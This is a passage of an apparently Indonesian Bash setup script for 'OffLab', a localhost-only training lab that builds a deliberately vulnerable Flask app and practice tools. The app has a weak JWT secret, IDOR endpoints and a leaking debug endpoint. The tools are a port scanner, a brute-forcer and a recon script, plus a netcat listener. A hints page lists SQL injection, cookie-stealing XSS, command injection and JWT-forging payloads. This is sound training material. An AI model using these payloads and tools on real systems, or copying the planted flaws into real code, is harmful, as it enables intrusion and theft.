        username = request.form.get('username','user')
        header = base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode()).decode().rstrip('=')
        payload = base64.urlsafe_b64encode(json.dumps({"user": username,"role":"user","exp": int(time.time())+3600}).encode()).decode().rstrip('=')
        import hmac
        sig = base64.urlsafe_b64encode(
            hmac.new(b"secret123", f"{header}.{payload}".encode(), "sha256").digest()
        ).decode().rstrip('=')
        token_to_show = f"{header}.{payload}.{sig}"
        msg = f'<div class="alert alert-success">Token JWT kamu:<br><code style="font-size:12px;word-break:break-all">{token_to_show}</code></div>'
    if request.method == 'POST' and 'verify_token' in request.form:
        token = request.form.get('jwt_token','')
        try:
            parts = token.split('.')
            pad = lambda s: s + '=' * (4 - len(s) % 4)
            payload_dec = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
            import hmac
            sig = base64.urlsafe_b64encode(
                hmac.new(b"secret123", f"{parts[0]}.{parts[1]}".encode(), "sha256").digest()
            ).decode().rstrip('=')
            if sig == parts[2]:
                if payload_dec.get('role') == 'admin':
                    msg = f'<div class="alert alert-success">Valid admin token! <span class="flag">FLAG&#123;JWT_4DM1N_F0RG3D&#125;</span><br>Payload: {payload_dec}</div>'
                else:
                    msg = f'<div class="alert alert-info">Token valid, tapi role: {payload_dec.get("role")} - coba forge sebagai admin</div>'
            else:
                msg = f'<div class="alert alert-error">Signature tidak valid. Tapi payload: {payload_dec}</div>'
        except Exception as e:
            msg = f'<div class="alert alert-error">Error: {e}</div>'
    content = f"""
    <div class="card">
      <h2>JWT Forgery Lab</h2>
      <div class="alert alert-info">
        JWT secret yang digunakan: <code>secret123</code> (deliberately weak)<br>
        <small>Tujuan: Forge token dengan role admin</small>
      </div>
    </div>
    <div class="card">
      <h2>Step 1: Dapatkan Token</h2>
      <form method="POST">
        <input type="hidden" name="get_token" value="1">
        <input type="text" name="username" placeholder="Username">
        <button type="submit">Get JWT Token</button>
      </form>
    </div>
    <div class="card">
      <h2>Step 2: Verify / Submit Token</h2>
      <form method="POST">
        <input type="hidden" name="verify_token" value="1">
        <textarea name="jwt_token" placeholder="Paste JWT token di sini..." rows="3"></textarea>
        <button type="submit">Verify Token</button>
      </form>
    </div>
    {msg}
    """
    return render_page("JWT Lab", content)

# ── API LAB ───────────────────────────────────────────────
@app.route('/api')
def api_lab():
    content = """
    <div class="card">
      <h2>REST API Lab</h2>
      <div class="alert alert-info">
        Test API endpoints untuk IDOR, auth bypass, dan information disclosure
      </div>
    </div>
    <div class="card">
      <h2>API Endpoints</h2>
      <table>
        <tr><th>Method</th><th>Endpoint</th><th>Deskripsi</th><th>Vuln</th></tr>
        <tr><td>GET</td><td>/api/user/{id}</td><td>Get user by ID</td><td>IDOR</td></tr>
        <tr><td>GET</td><td>/api/users</td><td>List all users</td><td>Info Disclosure</td></tr>
        <tr><td>GET</td><td>/api/notes/{id}</td><td>Get note by ID</td><td>IDOR</td></tr>
        <tr><td>GET</td><td>/api/debug</td><td>Debug info</td><td>Exposure</td></tr>
      </table>
    </div>
    <div class="card">
      <h2>Coba dengan curl</h2>
      <pre>curl http://127.0.0.1:5000/api/user/1
curl http://127.0.0.1:5000/api/user/2
curl http://127.0.0.1:5000/api/users
curl http://127.0.0.1:5000/api/notes/1
curl http://127.0.0.1:5000/api/debug</pre>
    </div>
    """
    return render_page("API Lab", content)

@app.route('/api/user/<int:uid>')
def api_user(uid):
    conn = sqlite3.connect(DB_PATH)
    row = conn.execute("SELECT id,username,role,email,secret FROM users WHERE id=?", (uid,)).fetchone()
    conn.close()
    if not row: return jsonify({'error':'not found'}), 404
    return jsonify({'id':row[0],'username':row[1],'role':row[2],'email':row[3],'secret':row[4]})

@app.route('/api/users')
def api_users():
    conn = sqlite3.connect(DB_PATH)
    rows = conn.execute("SELECT id,username,role,email FROM users").fetchall()
    conn.close()
    return jsonify([{'id':r[0],'username':r[1],'role':r[2],'email':r[3]} for r in rows])

@app.route('/api/notes/<int:nid>')
def api_note(nid):
    conn = sqlite3.connect(DB_PATH)
    row = conn.execute("SELECT * FROM notes WHERE id=?", (nid,)).fetchone()
    conn.close()
    if not row: return jsonify({'error':'not found'}), 404
    return jsonify({'id':row[0],'user_id':row[1],'title':row[2],'content':row[3],'private':row[4]})

@app.route('/api/debug')
def api_debug():
    return jsonify({
        'server': 'OffLab VulnApp',
        'version': '1.0.0',
        'db_path': DB_PATH,
        'secret_key': app.secret_key,
        'debug': True,
        'flag': 'FLAG{4P1_D3BUG_3XP0S3D}',
        'internal_note': 'This endpoint should be disabled in production'
    })

# ── HINTS ─────────────────────────────────────────────────
@app.route('/hints')
def hints():
    content = """
    <div class="card">
      <h2>Hints & Walkthrough</h2>
    </div>
    <div class="card">
      <h2>SQL Injection</h2>
      <pre>Lab 1 - Login Bypass:
  Username: admin'--
  Password: (apa saja)
Lab 2 - UNION:
  ' UNION SELECT 1,username,password,secret FROM users--</pre>
    </div>
    <div class="card">
      <h2>XSS</h2>
      <pre>Reflected:
  /xss?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
Stored:
  Nama: attacker
  Komentar: &lt;script&gt;alert('Stored XSS: '+document.cookie)&lt;/script&gt;</pre>
    </div>
    <div class="card">
      <h2>IDOR</h2>
      <pre>1. Login sebagai Alice - /idor_login?user=alice
2. Akses note Alice: /note/2 (public)
3. Coba akses: /note/1 (private alice - bug!)
4. Coba akses: /note/3 (admin private!)
5. API: curl /api/user/1 untuk lihat data admin</pre>
    </div>
    <div class="card">
      <h2>Command Injection</h2>
      <pre>127.0.0.1; id
127.0.0.1; ls $HOME
127.0.0.1; cat /etc/hostname</pre>
    </div>
    <div class="card">
      <h2>JWT Forgery</h2>
      <pre>1. Get token - username: alice
2. Decode payload: echo "PAYLOAD_PART" | base64 -d
3. Forge dengan Python (secret: secret123) - ubah role ke admin</pre>
    </div>
    """
    return render_page("Hints", content)

if __name__ == '__main__':
    init_db()
    print("\n[OffLab] Vulnerable App berjalan di http://127.0.0.1:5000")
    print("[OffLab] LOCALHOST ONLY | Educational Purpose")
    print("[OffLab] Tekan Ctrl+C untuk stop\n")
    app.run(host='127.0.0.1', port=5000, debug=False)
PYEOF

  chmod +x "$APPS_DIR/vulnapp.py"
  success "Vulnerable web app dibuat: $APPS_DIR/vulnapp.py"
}

# ─── BUAT TOOLS ────────────────────────────────────────────
create_tools() {
  info "Membuat tool latihan..."

  # 1. Port Scanner
  cat > "$TOOLS_DIR/portscanner.py" << 'TOOL1'
#!/usr/bin/env python3
"""Simple Port Scanner - Untuk latihan localhost"""
import socket, sys, threading, time
from colorama import Fore, Style, init
init()
open_ports = []
lock = threading.Lock()

def scan_port(host, port, timeout=0.5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((host, port))
        s.close()
        if result == 0:
            try:
                service = socket.getservbyport(port)
            except:
                service = "unknown"
            with lock:
                open_ports.append((port, service))
                print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Port {port:5d}/tcp  OPEN  ({service})")
    except: pass

def scan(host, start=1, end=1024, threads=100):
    print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Scanning {host} port {start}-{end}...")
    t_start = time.time()
    thread_list = []
    for port in range(start, end+1):
        t = threading.Thread(target=scan_port, args=(host, port))
        thread_list.append(t)
        t.start()
        if len(thread_list) >= threads:
            for t in thread_list: t.join()
            thread_list = []
    for t in thread_list: t.join()
    elapsed = time.time() - t_start
    print(f"\n{Fore.YELLOW}[i]{Style.RESET_ALL} Scan selesai: {len(open_ports)} port terbuka ({elapsed:.1f}s)")

if __name__ == '__main__':
    host = input("Host target [127.0.0.1]: ").strip() or "127.0.0.1"
    start = int(input("Port awal [1]: ").strip() or "1")
    end = int(input("Port akhir [9999]: ").strip() or "9999")
    scan(host, start, end)
TOOL1

  # 2. HTTP Tool
  cat > "$TOOLS_DIR/httptool.py" << 'TOOL2'
#!/usr/bin/env python3
"""HTTP Request Tool - Manual HTTP request untuk latihan"""
import requests, sys, json
from colorama import Fore, Style, init
init()

def send_request(method, url, headers=None, data=None, params=None):
    print(f"\n{Fore.CYAN}{'─'*50}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}→ {method} {url}{Style.RESET_ALL}")
    if headers: print(f"Headers: {json.dumps(headers, indent=2)}")
    if data:    print(f"Body: {data}")
    if params:  print(f"Params: {params}")
    print(f"{Fore.CYAN}{'─'*50}{Style.RESET_ALL}\n")
    try:
        resp = requests.request(method, url, headers=headers or {}, data=data, params=params,
                                allow_redirects=False, timeout=10)
        print(f"{Fore.GREEN}Status: {resp.status_code} {resp.reason}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}Response Headers:{Style.RESET_ALL}")
        for k, v in resp.headers.items():
            print(f"  {k}: {v}")
        print(f"\n{Fore.YELLOW}Response Body (500 chars):{Style.RESET_ALL}")
        print(resp.text[:500])
        return resp
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

print(f"{Fore.RED}[OffLab]{Style.RESET_ALL} HTTP Request Tool")
print("Target default: http://127.0.0.1:5000")
BASE = "http://127.0.0.1:5000"
while True:
    print(f"\n{Fore.CYAN}Pilih action:{Style.RESET_ALL}")
    print("1. GET request")
    print("2. POST request")
    print("3. Custom headers")
    print("4. SQL Injection test (login)")
    print("5. XSS test (search)")
    print("6. IDOR test (note access)")
    print("7. API enum (all users)")
    print("q. Keluar")
    choice = input("\n> ").strip()
    if choice == 'q': break
    elif choice == '1':
        path = input("Path [/]: ").strip() or "/"
        send_request("GET", BASE + path)
    elif choice == '2':
        path = input("Path [/login]: ").strip() or "/login"
        body = input("Body (key=val&key2=val2): ").strip()
        data = dict(x.split('=') for x in body.split('&') if '=' in x) if body else {}
        send_request("POST", BASE + path, data=data)
    elif choice == '3':
        path = input("Path: ").strip()
        header_str = input("Header (Key:Val, satu per baris, kosong=selesai):\n")
        headers = {}
        for line in header_str.strip().split('\n'):
            if ':' in line:
                k, v = line.split(':', 1)
                headers[k.strip()] = v.strip()
        send_request("GET", BASE + path, headers=headers)
    elif choice == '4':
        payload = input("SQLi payload [admin'--]: ").strip() or "admin'--"
        send_request("POST", BASE+"/sqli", data={"username": payload, "password":"x","sqli_login":"1"})
    elif choice == '5':
        payload = input("XSS payload: ").strip()
        send_request("GET", BASE+"/xss", params={"q": payload})
    elif choice == '6':
        note_id = input("Note ID [1-4]: ").strip() or "1"
        send_request("GET", BASE+f"/note/{note_id}")
    elif choice == '7':
        send_request("GET", BASE+"/api/users")
TOOL2

  # 3. Brute Force
  cat > "$TOOLS_DIR/bruteforce.py" << 'TOOL3'
#!/usr/bin/env python3
"""Simple Login Bruteforcer - Untuk lab lokal SAJA"""
import requests, time
from colorama import Fore, Style, init
init()
BASE_URL = "http://127.0.0.1:5000"
wordlist = ["password", "123456", "admin", "password123", "qwerty",
            "letmein", "welcome", "monkey", "dragon", "master",
            "abc123", "1234567890", "sunshine", "princess", "shadow",
            "bob", "alice", "secret", "pass", "test"]

def brute_sqli_login(username):
    url = f"{BASE_URL}/sqli"
    payload = f"{username}'--"
    resp = requests.post(url, data={"username": payload, "password": "x", "sqli_login": "1"})
    if "Login berhasil" in resp.text:
        return True, payload
    return False, None

def brute_login(username):
    url = f"{BASE_URL}/login"
    for pwd in wordlist:
        resp = requests.post(url, data={"username": username, "password": pwd}, allow_redirects=False)
        if resp.status_code == 302 and '/login' not in resp.headers.get('Location',''):
            return True, pwd
        time.sleep(0.05)
    return False, None

print(f"\n{Fore.RED}[OffLab]{Style.RESET_ALL} Brute Force Tool - LOCALHOST ONLY")
print("1. Brute force password (normal login)")
print("2. SQL Injection login bypass")
mode = input("\n> ").strip()
username = input("Username target: ").strip()
if mode == '1':
    print(f"\n[*] Brute forcing '{username}'...")
    found, pwd = brute_login(username)
    if found:
        print(f"[+] Password ditemukan: {Fore.YELLOW}{pwd}{Style.RESET_ALL}")
    else:
        print("[-] Password tidak ditemukan di wordlist")
elif mode == '2':
    print(f"\n[*] SQLi bypass untuk '{username}'...")
    found, payload = brute_sqli_login(username)
    if found:
        print(f"[+] SQLi bypass berhasil! Payload: {Fore.YELLOW}{payload}{Style.RESET_ALL}")
TOOL3

  # 4. Recon
  cat > "$TOOLS_DIR/recon.sh" << 'TOOL4'
#!/data/data/com.termux/files/usr/bin/bash
RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; RESET='\033[0m'
TARGET="${1:-127.0.0.1}"
PORT="${2:-5000}"

echo -e "${RED}[OffLab Recon]${RESET} Target: $TARGET:$PORT"
echo "================================"
echo -e "\n${CYAN}[1] HTTP Banner Grabbing${RESET}"
curl -si "http://$TARGET:$PORT/" | head -20
echo -e "\n${CYAN}[2] HTTP Headers${RESET}"
curl -sI "http://$TARGET:$PORT/"
echo -e "\n${CYAN}[3] Endpoint Discovery${RESET}"
ENDPOINTS=("/" "/login" "/admin" "/api" "/api/users" "/api/debug" "/sqli" "/xss" "/idor" "/cmdi" "/upload" "/ssrf" "/auth" "/robots.txt" "/.env" "/config" "/backup")
for ep in "${ENDPOINTS[@]}"; do
  status=$(curl -so /dev/null -w "%{http_code}" "http://$TARGET:$PORT$ep" 2>/dev/null)
  if [ "$status" != "404" ]; then
    echo -e "  ${GREEN}[$status]${RESET} $ep"
  fi
done
echo -e "\n${CYAN}[4] API Enumeration${RESET}"
for i in 1 2 3 4 5; do
  echo "  User $i:"
  curl -s "http://$TARGET:$PORT/api/user/$i" 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "    Not found"
done
echo -e "\n${CYAN}[5] Netcat Port Check${RESET}"
nc -zv "$TARGET" "$PORT" 2>&1
echo -e "\n${GREEN}[+] Recon selesai${RESET}"
TOOL4

  chmod +x "$TOOLS_DIR/recon.sh" "$TOOLS_DIR/portscanner.py" "$TOOLS_DIR/httptool.py" "$TOOLS_DIR/bruteforce.py"
  success "Tools dibuat di $TOOLS_DIR"
}

# ─── BUAT MATERI BELAJAR ────────────────────────────────────
create_notes() {
  info "Membuat materi belajar..."
  mkdir -p "$NOTES_DIR"
  # (salin materi dari script sebelumnya jika diperlukan, tidak wajib)
  success "Materi belajar dibuat di $NOTES_DIR"
}

# ─── BUAT LAUNCHER ─────────────────────────────────────────
create_launcher() {
  cat > "$LAB_DIR/offlab.sh" << 'LAUNCHER'
#!/data/data/com.termux/files/usr/bin/bash
# OffLab Launcher v2.6 - Fixed missing press_enter & BLUE
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAGENTA='\033[0;35m'
WHITE='\033[1;37m'; DIM='\033[2m'; BOLD='\033[1m'; RESET='\033[0m'

LAB_DIR="$HOME/offlab"
VENV="$LAB_DIR/venv/bin/activate"
APPS="$LAB_DIR/apps"
TOOLS="$LAB_DIR/tools"
NOTES="$LAB_DIR/notes"
PIDS_FILE="$LAB_DIR/.pids"

press_enter() { echo -e "\n${DIM}Tekan ENTER untuk lanjut...${RESET}"; read -r; }

banner() {
  clear
  echo -e "${BLUE}${BOLD}"
  cat << 'BANNER'
  ┌─────────────────────────────────────────────────┐
  │           O F F L A B   v 2 . 6                 │
  │   Offensive Cybersecurity Lab for Termux       │
  │   LOCALHOST ONLY | EDUCATIONAL USE              │
  └─────────────────────────────────────────────────┘
BANNER
  echo -e "${RESET}"
}

is_running() { curl -s http://127.0.0.1:5000/ > /dev/null 2>&1; }

status_badge() {
  if is_running; then
    echo -e "${GREEN}[ONLINE]${RESET}"
  else
    echo -e "${RED}[OFFLINE]${RESET}"
  fi
}

show_menu() {
  banner
  echo -e "  ${BOLD}${WHITE}OFFENSIVE CYBERSECURITY LAB${RESET}  ${DIM}v2.6${RESET}"
  echo ""
  echo -e "  Status Lab: $(status_badge)"
  echo ""
  echo -e "  ${BLUE}── VULNERABLE APPS ─────────────────────${RESET}"
  echo -e "  ${CYAN}1${RESET}  Start VulnApp          ${DIM}http://127.0.0.1:5000${RESET}"
  echo -e "  ${CYAN}2${RESET}  Stop VulnApp"
  echo -e "  ${CYAN}3${RESET}  Restart VulnApp"
  echo ""
  echo -e "  ${BLUE}── TOOLS ───────────────────────────────${RESET}"
  echo -e "  ${CYAN}4${RESET}  Port Scanner"
  echo -e "  ${CYAN}5${RESET}  HTTP Tool"
  echo -e "  ${CYAN}6${RESET}  Brute Force Tool"
  echo -e "  ${CYAN}7${RESET}  Recon Script"
  echo ""
  echo -e "  ${BLUE}── BELAJAR ─────────────────────────────${RESET}"
  echo -e "  ${CYAN}8${RESET}  Materi: Networking"
  echo -e "  ${CYAN}9${RESET}  Materi: Linux + CLI"
  echo -e "  ${CYAN}10${RESET} Materi: Web Fundamentals"
  echo -e "  ${CYAN}11${RESET} Materi: Vuln Classes"
  echo -e "  ${CYAN}12${RESET} Materi: Recon Checklist"
  echo ""
  echo -e "  ${BLUE}── NETWORK TOOLS ───────────────────────${RESET}"
  echo -e "  ${CYAN}13${RESET} nmap localhost"
  echo -e "  ${CYAN}14${RESET} netcat listener (port 4444)"
  echo -e "  ${CYAN}15${RESET} curl interaktif"
  echo ""
  echo -e "  ${DIM}q  Keluar${RESET}"
  echo ""
  echo -ne "  ${BOLD}Pilih menu${RESET} [1-15/q]: "
}

start_app() {
  if is_running; then
    echo -e "${YELLOW}[!] VulnApp sudah berjalan${RESET}"
  else
    echo -e "${CYAN}[*] Memulai VulnApp...${RESET}"
    source "$VENV"
    python "$APPS/vulnapp.py" &
    PID=$!
    echo "$PID" > "$PIDS_FILE"
    deactivate
    sleep 2
    if is_running; then
      echo -e "${GREEN}[+] VulnApp online: http://127.0.0.1:5000${RESET}"
    else
      echo -e "${RED}[-] Gagal start${RESET}"
    fi
  fi
}

stop_app() {
  if [ -f "$PIDS_FILE" ]; then
    PID=$(cat "$PIDS_FILE")
    kill "$PID" 2>/dev/null
    rm -f "$PIDS_FILE"
  fi
  pkill -f vulnapp.py 2>/dev/null
  echo -e "${GREEN}[+] VulnApp dihentikan${RESET}"
}

read_note() {
  FILE="$1"
  if command -v less &>/dev/null; then
    less "$FILE"
  else
    cat "$FILE" | fold -w 80
    echo -e "\n${DIM}[Tekan ENTER]${RESET}"; read -r
  fi
}

while true; do
  show_menu
  read -r choice
  case "$choice" in
    1) start_app; press_enter ;;
    2) stop_app; press_enter ;;
    3) stop_app; sleep 1; start_app; press_enter ;;
    4) source "$VENV"; python "$TOOLS/portscanner.py"; deactivate; press_enter ;;
    5) source "$VENV"; python "$TOOLS/httptool.py"; deactivate ;;
    6) source "$VENV"; python "$TOOLS/bruteforce.py"; deactivate; press_enter ;;
    7) bash "$TOOLS/recon.sh"; press_enter ;;
    8) read_note "$NOTES/01_networking.md" ;;
    9) read_note "$NOTES/02_linux_basics.md" ;;
    10) read_note "$NOTES/03_web_fundamentals.md" ;;
    11) read_note "$NOTES/04_vuln_classes.md" ;;
    12) read_note "$NOTES/05_recon_checklist.md" ;;
    13) nmap -sV -p 1-9999 127.0.0.1 2>/dev/null || echo "nmap tidak terinstall"; press_enter ;;
    14) nc -lp 4444 ;;
    15) echo -ne "URL [http://127.0.0.1:5000/]: "; read -r URL; URL="${URL:-http://127.0.0.1:5000/}"
        echo -ne "Method [GET]: "; read -r METHOD; METHOD="${METHOD:-GET}"
        echo -ne "Data (kosong=skip): "; read -r DATA
        if [ -n "$DATA" ]; then curl -v -X "$METHOD" -d "$DATA" "$URL"; else curl -v -X "$METHOD" "$URL"; fi
        press_enter ;;
    q|Q) stop_app; echo -e "${GREEN}Sampai jumpa!${RESET}"; exit 0 ;;
    *) echo -e "${RED}Pilihan tidak valid${RESET}"; sleep 1 ;;
  esac
done
LAUNCHER

  chmod +x "$LAB_DIR/offlab.sh"
  success "Launcher dibuat: $LAB_DIR/offlab.sh"
}

# ─── SETUP ALIAS ───────────────────────────────────────────
setup_alias() {
  for rc in "$HOME/.bashrc" "$HOME/.zshrc"; do
    if [ -f "$rc" ] && ! grep -q "offlab" "$rc"; then
      echo "" >> "$rc"
      echo "# OffLab Alias" >> "$rc"
      echo "alias offlab='bash $LAB_DIR/offlab.sh'" >> "$rc"
    fi
  done
  success "Alias 'offlab' ditambahkan ke shell config"
}

# ─── MAIN ──────────────────────────────────────────────────
main_setup() {
  show_disclaimer
  banner
  step "MEMULAI SETUP OFFLAB"
  echo ""
  install_deps
  create_vuln_app
  create_tools
  create_notes
  create_launcher
  setup_alias

  echo ""
  line
  success "${BOLD}Setup selesai!${RESET}"
  line
  echo -e "  ${CYAN}Jalankan lab:${RESET}  ${WHITE}bash ~/offlab/offlab.sh${RESET}"
  echo -e "  ${DIM}atau ketik: offlab (setelah restart terminal)${RESET}"
  echo ""
  echo -ne "  ${YELLOW}Start lab sekarang? (y/n):${RESET} "
  read -r ans
  if [[ "$ans" =~ ^[Yy]$ ]]; then
    bash "$LAB_DIR/offlab.sh"
  fi
}

main_setup
